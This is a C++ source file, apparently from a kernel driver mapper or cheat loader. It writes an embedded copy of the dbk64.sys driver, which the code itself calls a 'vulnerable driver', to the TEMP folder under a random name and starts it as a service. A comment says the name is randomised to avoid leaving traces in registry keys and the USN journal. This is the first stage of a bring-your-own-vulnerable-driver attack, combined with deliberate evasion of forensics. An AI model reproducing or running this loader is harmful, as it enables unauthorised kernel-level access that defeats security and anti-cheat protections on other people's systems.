#include "ce_driver.hpp"
char ce_driver::driver_name[100] = {};

std::wstring ce_driver::GetDriverNameW() {
	std::string t(ce_driver::driver_name);
	std::wstring name(t.begin(), t.end());
	return name;
}

std::wstring ce_driver::GetDriverPath() {
	std::wstring temp = utils::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

BOOL ce_driver::Load() {
	BOOL result = FALSE;

	srand((unsigned)time(NULL) * GetCurrentThreadId());
	
	// TODO: check the dbk64.sys service is already running.
	//if (ce_driver::IsRunning()) {
	//	Log(L"[-] \\Device\\Nal is already in use." << std::endl);
	//	return INVALID_HANDLE_VALUE;
	//}

	//Randomize name for log in registry keys, usn jornal and other shits
	memset(ce_driver::driver_name, 0, sizeof(ce_driver::driver_name));
	static const char alphanum[] =
		"abcdefghijklmnopqrstuvwxyz"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	int len = rand() % 20 + 10;
	for (int i = 0; i < len; ++i)
		ce_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	
	Log("Loading vulnerable driver: %s", ce_driver::driver_name);

	std::wstring driver_path = GetDriverPath();
	if (driver_path.empty()) {
		Log("Can't find TEMP folder");
		return result;
	}

	_wremove(driver_path.c_str());

	// HelloWorld.sys
	//if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(helloworld_driver_resource::driver), sizeof(helloworld_driver_resource::driver))) {
	//	Log("Failed to create vulnerable driver file");
	//	return result;
	//}

	
#ifdef  _DEBUG

	// self compiled dbk64.sys
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(test_dbk64_driver_resource::driver), sizeof(test_dbk64_driver_resource::driver))) {
		Log("Failed to create vulnerable driver file");
		return result;
	}

#else

	// dbk64.sys
	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(dbk64_driver_resource::driver), sizeof(dbk64_driver_resource::driver))) {
		Log("Failed to create vulnerable driver file");
		return result;
	}

#endif //  _DEBUG


	if (!service::RegisterAndStart(driver_path, ce_driver::GetDriverNameW())) {
		Log("Failed to register and start service for the vulnerable driver");
		_wremove(driver_path.c_str());
		return result;
	}
	

	result = TRUE;
	return result;
}